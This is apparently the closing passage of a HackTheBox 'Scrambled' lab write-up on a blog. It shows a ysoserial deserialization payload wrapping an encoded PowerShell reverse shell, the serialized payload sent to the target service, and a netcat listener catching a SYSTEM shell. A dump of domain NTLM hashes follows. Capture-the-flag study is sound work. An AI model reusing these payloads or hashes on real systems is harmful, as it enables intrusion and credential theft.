<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\liw\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt;.\ysoserial.exe -g DataSet -c <span class="string">&quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;</span> -f BinaryFormatter -o <span class="built_in">base64</span></span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAANMIAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA9Q88P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLWUgSkFCakFHd0FhUUJsQUc0QWRBQWdBRDBBSUFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZNQWJ3QmpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQkRBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQXdBQzRBTVFBd0FDNEFNUUEyQUM0QU1RQXhBQ0lBTEFBNUFEQUFNQUF4QUNrQU93QWtBSE1BZEFCeUFHVUFZUUJ0QUNBQVBRQWdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkhBR1VBZEFCVEFIUUFjZ0JsQUdFQWJRQW9BQ2tBT3dCYkFHSUFlUUIwQUdVQVd3QmRBRjBBSkFCaUFIa0FkQUJsQUhNQUlBQTlBQ0FBTUFBdUFDNEFOZ0ExQURVQU13QTFBSHdBSlFCN0FEQUFmUUE3QUhjQWFBQnBBR3dBWlFBb0FDZ0FKQUJwQUNBQVBRQWdBQ1FBY3dCMEFISUFaUUJoQUcwQUxnQlNBR1VBWVFCa0FDZ0FKQUJpQUhrQWRBQmxBSE1BTEFBZ0FEQUFMQUFnQUNRQVlnQjVBSFFBWlFCekFDNEFUQUJsQUc0QVp3QjBBR2dBS1FBcEFDQUFMUUJ1QUdVQUlBQXdBQ2tBZXdBN0FDUUFaQUJoQUhRQVlRQWdBRDBBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUF0QUZRQWVRQndBR1VBVGdCaEFHMEFaUUFnQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRUVBVXdCREFFa0FTUUJGQUc0QVl3QnZBR1FBYVFCdUFHY0FLUUF1QUVjQVpRQjBBRk1BZEFCeUFHa0FiZ0JuQUNnQUpBQmlBSGtBZEFCbEFITUFMQUF3QUN3QUlBQWtBR2tBS1FBN0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFDQUFQUUFnQUNnQWFRQmxBSGdBSUFBa0FHUUFZUUIwQUdFQUlBQXlBRDRBSmdBeEFDQUFmQUFnQUU4QWRRQjBBQzBBVXdCMEFISUFhUUJ1QUdjQUlBQXBBRHNBSkFCekFHVUFiZ0JrQUdJQVlRQmpBR3NBTWdBZ0FEMEFJQUFrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0FnQUNzQUlBQWlBRkFBVXdBZ0FDSUFJQUFyQUNBQUtBQndBSGNBWkFBcEFDNEFVQUJoQUhRQWFBQWdBQ3NBSUFBaUFENEFJQUFpQURzQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUlBQTlBQ0FBS0FCYkFIUUFaUUI0QUhRQUxnQmxBRzRBWXdCdkFHUUFhUUJ1QUdjQVhRQTZBRG9BUVFCVEFFTUFTUUJKQUNrQUxnQkhBR1VBZEFCQ0FIa0FkQUJsQUhNQUtBQWtBSE1BWlFCdUFHUUFZZ0JoQUdNQWF3QXlBQ2tBT3dBa0FITUFkQUJ5QUdVQVlRQnRBQzRBVndCeUFHa0FkQUJsQUNnQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUxBQXdBQ3dBSkFCekFHVUFiZ0JrQUdJQWVRQjBBR1VBTGdCTUFHVUFiZ0JuQUhRQWFBQXBBRHNBSkFCekFIUUFjZ0JsQUdFQWJRQXVBRVlBYkFCMUFITUFhQUFvQUNrQWZRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkRBR3dBYndCekFHVUFLQUFwQUE9PSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==</span><br><span class="line"></span><br><span class="line">UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAANMIAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA9Q88P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLWUgSkFCakFHd0FhUUJsQUc0QWRBQWdBRDBBSUFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZNQWJ3QmpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQkRBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQXdBQzRBTVFBd0FDNEFNUUEyQUM0QU1RQXhBQ0lBTEFBNUFEQUFNQUF4QUNrQU93QWtBSE1BZEFCeUFHVUFZUUJ0QUNBQVBRQWdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkhBR1VBZEFCVEFIUUFjZ0JsQUdFQWJRQW9BQ2tBT3dCYkFHSUFlUUIwQUdVQVd3QmRBRjBBSkFCaUFIa0FkQUJsQUhNQUlBQTlBQ0FBTUFBdUFDNEFOZ0ExQURVQU13QTFBSHdBSlFCN0FEQUFmUUE3QUhjQWFBQnBBR3dBWlFBb0FDZ0FKQUJwQUNBQVBRQWdBQ1FBY3dCMEFISUFaUUJoQUcwQUxnQlNBR1VBWVFCa0FDZ0FKQUJpQUhrQWRBQmxBSE1BTEFBZ0FEQUFMQUFnQUNRQVlnQjVBSFFBWlFCekFDNEFUQUJsQUc0QVp3QjBBR2dBS1FBcEFDQUFMUUJ1QUdVQUlBQXdBQ2tBZXdBN0FDUUFaQUJoQUhRQVlRQWdBRDBBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUF0QUZRQWVRQndBR1VBVGdCaEFHMEFaUUFnQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRUVBVXdCREFFa0FTUUJGQUc0QVl3QnZBR1FBYVFCdUFHY0FLUUF1QUVjQVpRQjBBRk1BZEFCeUFHa0FiZ0JuQUNnQUpBQmlBSGtBZEFCbEFITUFMQUF3QUN3QUlBQWtBR2tBS1FBN0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFDQUFQUUFnQUNnQWFRQmxBSGdBSUFBa0FHUUFZUUIwQUdFQUlBQXlBRDRBSmdBeEFDQUFmQUFnQUU4QWRRQjBBQzBBVXdCMEFISUFhUUJ1QUdjQUlBQXBBRHNBSkFCekFHVUFiZ0JrQUdJQVlRQmpBR3NBTWdBZ0FEMEFJQUFrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0FnQUNzQUlBQWlBRkFBVXdBZ0FDSUFJQUFyQUNBQUtBQndBSGNBWkFBcEFDNEFVQUJoQUhRQWFBQWdBQ3NBSUFBaUFENEFJQUFpQURzQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUlBQTlBQ0FBS0FCYkFIUUFaUUI0QUhRQUxnQmxBRzRBWXdCdkFHUUFhUUJ1QUdjQVhRQTZBRG9BUVFCVEFFTUFTUUJKQUNrQUxnQkhBR1VBZEFCQ0FIa0FkQUJsQUhNQUtBQWtBSE1BWlFCdUFHUUFZZ0JoQUdNQWF3QXlBQ2tBT3dBa0FITUFkQUJ5QUdVQVlRQnRBQzRBVndCeUFHa0FkQUJsQUNnQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUxBQXdBQ3dBSkFCekFHVUFiZ0JrQUdJQWVRQjBBR1VBTGdCTUFHVUFiZ0JuQUhRQWFBQXBBRHNBSkFCekFIUUFjZ0JsQUdFQWJRQXVBRVlBYkFCMUFITUFhQUFvQUNrQWZRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkRBR3dBYndCekFHVUFLQUFwQUE9PSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==</span><br><span class="line">ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.</span><br><span class="line"></span><br><span class="line">$ rlwrap -cAr nc -lvnp 9001</span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.10.11.168 57400</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">cd</span> C:\<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
<p>got it</p>
<h2 id="shell-as-nt-authority"><a href="#shell-as-nt-authority" class="headerlink" title="shell as nt authority"></a>shell as nt authority</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">administrator:500:aad3b435b51404eeaad3b435b51404ee:e2bba07a8348bca150ac6ffee6a3afbb:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0d3c072340cb5cdfca9c7f86e47a0beb:::</span><br><span class="line">tstar:1106:aad3b435b51404eeaad3b435b51404ee:5b8b52689acd5a0e6587f9c8d3b07fc7:::</span><br><span class="line">asmith:1107:aad3b435b51404eeaad3b435b51404ee:0a7e978fd5e254ce555e5fed405bba29:::</span><br><span class="line">sjenkins:1118:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::</span><br><span class="line">sdonington:1119:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::</span><br><span class="line">backupsvc:1601:aad3b435b51404eeaad3b435b51404ee:6f410302e092bdcf7802401cc55e4a4d:::</span><br><span class="line">jhall:1603:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::</span><br><span class="line">rsmith:1604:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::</span><br><span class="line">ehooker:1605:aad3b435b51404eeaad3b435b51404ee:a0a5fa8b2f1df7d4acfca315e4a3ba82:::</span><br><span class="line">khicks:1611:aad3b435b51404eeaad3b435b51404ee:589cf9b5f911fd6fe70694a4ba4bccd0:::</span><br><span class="line">sqlsvc:1613:aad3b435b51404eeaad3b435b51404ee:b999a16500b87d17ec7f2e2a68778f05:::</span><br><span class="line">miscsvc:1617:aad3b435b51404eeaad3b435b51404ee:c959a21bb08e42e36ff9f0fa434caab5:::</span><br><span class="line">ksimpson:1619:aad3b435b51404eeaad3b435b51404ee:5f38c0485f0c23f8dedf9bf23ffa5336:::</span><br><span class="line">DC1$:1000:aad3b435b51404eeaad3b435b51404ee:1d7221130f867a5e322111846a1b8642:::</span><br><span class="line">WS01$:1120:aad3b435b51404eeaad3b435b51404ee:327202ce3bff07c2ea53d7f25d162fcb:::</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#80-web"><span class="toc-number">1.1.</span> <span class="toc-text">80 web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ksimpson-user-logon-smb"><span class="toc-number">1.2.</span> <span class="toc-text">ksimpson user logon smb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting-get-sqlsvc-hash"><span class="toc-number">1.3.</span> <span class="toc-text">kerberoasting get sqlsvc hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logon-mssql-and-enum-and-reverse"><span class="toc-number">1.4.</span> <span class="toc-text">logon mssql and enum and reverse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-as-sqlsvc"><span class="toc-number">1.5.</span> <span class="toc-text">shell as sqlsvc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-miscsvc"><span class="toc-number">2.</span> <span class="toc-text">shell as miscsvc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-nt-authority"><span class="toc-number">3.</span> <span class="toc-text">shell as nt authority</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">3.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&text=HackTheBox——Tracks AD Scrambled"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&is_video=false&description=HackTheBox——Tracks AD Scrambled"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——Tracks AD Scrambled&body=Check out this article: https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&title=HackTheBox——Tracks AD Scrambled"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&name=HackTheBox——Tracks AD Scrambled&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/Scrambled/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Scrambled/&t=HackTheBox——Tracks AD Scrambled"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    n0nome
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
